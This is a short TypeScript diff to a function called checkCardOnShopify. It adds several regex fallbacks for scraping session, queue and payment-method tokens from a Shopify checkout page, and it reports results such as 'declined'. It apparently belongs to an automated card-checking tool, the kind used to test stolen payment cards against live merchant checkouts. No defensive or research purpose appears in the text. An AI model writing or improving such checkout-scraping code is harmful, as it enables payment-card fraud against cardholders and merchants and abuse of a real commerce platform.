@@ -141,11 +141,22 @@ async function checkCardOnShopify(
     if (checkoutCookies) cookies += "; " + checkoutCookies.split(",").map((c: string) => c.split(";")[0].trim()).filter(Boolean).join("; ");
 
     // Extract tokens from checkout page
-    const sessionTokenMatch = checkoutHtml.match(/name=\\\"serialized-sessionToken\\\"\\\\s+content=\\\"&quot;([^\\\"]+)&quot;\\\"/);
-    const sessionToken = sessionTokenMatch?.[1] || "";
-    const queueToken = findBetween(checkoutHtml, 'queueToken&quot;:&quot;', '&quot;');
-    const stableId = findBetween(checkoutHtml, 'stableId&quot;:&quot;', '&quot;');
-    const paymentMethodIdentifier = findBetween(checkoutHtml, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
+    // Try multiple patterns for session token extraction
+    let sessionToken = "";
+    const patterns = [
+      /name="serialized-sessionToken"\s+content="([^"]+)"/,
+      /serialized-sessionToken[^>]+content="([^"]+)"/,
+      /sessionToken&quot;:&quot;([^&]+)&quot;/,
+      /sessionToken":"([^"]+)"/,
+    ];
+    for (const pat of patterns) {
+      const m = checkoutHtml.match(pat);
+      if (m?.[1]) { sessionToken = m[1]; break; }
+    }
+
+    const queueToken = findBetween(checkoutHtml, 'queueToken":"', '"') || findBetween(checkoutHtml, 'queueToken&quot;:&quot;', '&quot;');
+    const stableId = findBetween(checkoutHtml, 'stableId":"', '"') || findBetween(checkoutHtml, 'stableId&quot;:&quot;', '&quot;');
+    const paymentMethodIdentifier = findBetween(checkoutHtml, 'paymentMethodIdentifier":"', '"') || findBetween(checkoutHtml, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
 
     if (!sessionToken) return { status: "declined", code: "NO_SESSION", message: "Could not extract session token" };
 
